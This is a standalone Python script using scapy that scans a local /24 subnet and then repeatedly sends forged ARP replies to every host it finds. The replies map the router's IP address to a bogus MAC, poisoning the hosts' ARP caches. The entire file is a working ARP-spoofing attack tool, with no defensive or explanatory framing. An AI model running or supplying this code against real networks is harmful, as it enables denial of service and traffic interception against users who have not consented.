from scapy import all
import threading
import json
import time
import subprocess
import itertools

router_ip = "192.168.31.1"
target_ip = "192.168.31.219"
target_mac = "e0:9d:31:de:a2:ba"
src_mac    = 'ab:ab:ab:ab:ab:ab'


class IPMap:

    def __init__(self):
        self.map = []
        self.ips = []
        self.ix = 0

    def add_addr(self, ip, mac):
        if ip in self.ips:
            return False

        self.map.append((ip, mac))
        self.ips.append(ip)

    def next(self):
        if len(self.map) == 0:
            return False, False

        self.ix += 1

        if self.ix >= len(self.map):
            self.ix = 0

        return self.map[self.ix]

def ip_exists(ip):
    try:
        print("Checking {}".format(ip))
        subprocess.run(['ping', ip, '-W', '1', '-c', '1'], timeout=1,
                       stdout=open('/tmp/null', 'w'))
        return True
    except:
        return False

def get_all_possible_ip(my_ip):
    # my_ip = "192.168.31.24"
    base_ip = '.'.join(my_ip.split('.')[:-1])
    ips = []
    for i in range(255):
        ip = base_ip + '.' + str(i)
        ips.append(ip)
    return ips

def get_mac_addr(target_ip):

    arp_question = all.ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip)
    resp, _ = all.sr(arp_question, timeout=2)
    try:
        arp_answer = resp[0][1]
        decoded = arp_answer[all.ARP]
        hwsrc   = decoded.hwsrc
        return hwsrc
    except:
        return False

def send_arp_poison(router_ip, target_ip, target_mac, src_mac="ab:ab:ab:ab:ab:ab"):
    # op stands for OP CODE, it's the type of message, ARP op 2 is an answer message
    # psrc stands for source ip, here, we want to pretend the message comes from router
    packet = all.ARP(op=2, psrc=router_ip, pdst=target_ip, hwdst=target_mac, hwsrc=src_mac)
    all.send(packet)

def feed_ipmap():
    ip_addresses = get_all_possible_ip('192.168.31.29')
    for ip in ip_addresses:
        if not ip_exists(ip):
            continue
        mac = get_mac_addr(ip)
        if mac is not False:
            ip2mac.add_addr(ip, mac)
            print("{} recognized as {}".format(ip, mac))

def main():

    while True:
        ip, mac = ip2mac.next()
        if not ip:
            continue
        print("[*] Poisoning {}".format(ip))
        send_arp_poison(router_ip, target_ip=ip, target_mac=mac) 
        time.sleep(.3)

ip2mac = IPMap()

scanner_thread = threading.Thread(target=feed_ipmap)
scanner_thread.start()
main()


